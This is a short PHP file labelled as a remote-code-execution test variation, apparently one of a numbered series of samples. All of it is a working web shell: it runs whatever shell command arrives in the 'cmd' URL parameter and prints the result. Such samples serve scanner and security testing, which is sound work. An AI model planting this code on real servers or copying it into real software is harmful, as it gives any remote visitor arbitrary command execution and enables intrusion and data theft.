<?php
// RCE test variation #820
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>